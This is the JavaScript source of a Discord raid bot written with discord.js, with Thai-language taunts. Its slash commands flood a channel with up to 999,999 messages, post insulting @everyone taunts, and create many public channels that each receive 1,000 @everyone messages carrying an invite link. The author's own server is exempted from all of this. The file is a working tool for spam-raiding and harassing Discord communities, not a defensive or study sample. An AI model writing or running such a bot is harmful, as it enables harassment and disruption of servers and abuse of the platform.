import {
  Client,
  GatewayIntentBits,
  ChannelType,
  PermissionsBitField
} from "discord.js";

import { joinVoiceChannel } from "@discordjs/voice";
import "dotenv/config";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
  ],
});

const LOG_CHANNEL_ID = "1461588208675459217";
const BLOCKED_GUILD_ID = "146024011876123456";

const randomMessages = [
  "@everyone เอ๋อ",
  "@everyone ร้องไร",
  "@everyone กูขำว่ะ",
  "@everyone คุ้มมั้ยเนี่ย",
  "@everyone เเค้นมั้ยถ้าเเค้นเข้าดิสมา5555",
  "@everyone เซิฟกากๆโดนยิงได้อะตลกกก",
  "@everyone อย่าร้องเลยสร้างใหม่ได้",
  "@everyone ไม่เอาไม่ร้องงงงงมากอดมาจุ๊บบมั๊ววว",
];

client.once("ready", () => {
  console.log(`${client.user.tag} is online.`);
});

client.on("interactionCreate", async (interaction) => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (!interaction.guild) return;

    if (BLOCKED_GUILD_ID && interaction.guild.id === BLOCKED_GUILD_ID) {
      return interaction.reply({
        content: "อย่ามาใช้ในเซิฟกู",
        ephemeral: true,
      });
    }

    if (LOG_CHANNEL_ID) {
      const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
      if (logChannel) {
        logChannel.send(`/${interaction.commandName} ใช้โดย ${interaction.user.tag}`);
      }
    }

    // /spam
    if (interaction.commandName === "spam") {
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);

      await interaction.reply({ content: "ลั่นละนะ", ephemeral: true });

      for (let i = 0; i < count; i++) {
        interaction.channel.send(text).catch(() => {});
      }
    }

    // /emoji
    if (interaction.commandName === "emoji") {
      const emoji = interaction.options.getString("emoji");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      const delay = Math.max(interaction.options.getInteger("delay") ?? 1, 1);

      await interaction.reply({ content: "ยิง emoji", ephemeral: true });

      for (let i = 0; i < count; i++) {
        interaction.channel.send(emoji).catch(() => {});
        await new Promise(r => setTimeout(r, delay));
      }
    }

    // /join
    if (interaction.commandName === "join") {
      const vc = interaction.member.voice?.channel;
      if (!vc) {
        return interaction.reply({
          content: "มึงเข้า vc ก่อน",
          ephemeral: true,
        });
      }

      joinVoiceChannel({
        channelId: vc.id,
        guildId: vc.guild.id,
        adapterCreator: vc.guild.voiceAdapterCreator,
        selfDeaf: false,
        selfMute: false
      });

      return interaction.reply({
        content: `เข้าห้อง ${vc.name} แล้ว`,
        ephemeral: true
      });
    }

    // /tell_off (เลือกจำนวนได้)
    if (interaction.commandName === "tell_off") {
      const count = interaction.options.getInteger("count") ?? 999999;

      await interaction.reply({ content: `ยิง ${count} ข้อความ`, ephemeral: true });

      for (let i = 0; i < count; i++) {
        interaction.channel.send(
          randomMessages[Math.floor(Math.random() * randomMessages.length)]
        ).catch(() => {});
      }
    }

    // /create_room (parallel 1000 per room)
    if (interaction.commandName === "create_room") {
      const amount = interaction.options.getInteger("amount");

      await interaction.reply({
        content: `กำลังสร้าง ${amount} ห้อง + ยิง 1000 พร้อมกัน`,
        ephemeral: true
      });

      // สร้างห้องทั้งหมดก่อน
      const channels = [];
      for (let i = 0; i < amount; i++) {
        const ch = await interaction.guild.channels.create({
          name: `ไม่เป็นไรนะสร้างใหม่ได้`,
          type: ChannelType.GuildText,
          permissionOverwrites: [
            {
              id: interaction.guild.roles.everyone.id,
              allow: [
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages
              ]
            }
          ],
        });
        channels.push(ch);
      }

      // ยิงพร้อมกันทุกห้อง
      const tasks = channels.map((ch) => (
        async () => {
          for (let j = 0; j < 1000; j++) {
            ch.send(`@everyone ไม่เป็นไรนะสร้างใหม่ได้ https://discord.gg/bdtRJBRyem`).catch(() => {});
          }
        }
      )());

      await Promise.all(tasks);

      await interaction.followUp({
        content: `ครบแล้วจ้า`,
        ephemeral: true
      });
    }

  } catch (err) {
    console.error("ERROR:", err);
  }
});

client.login(process.env.DISCORD_TOKEN);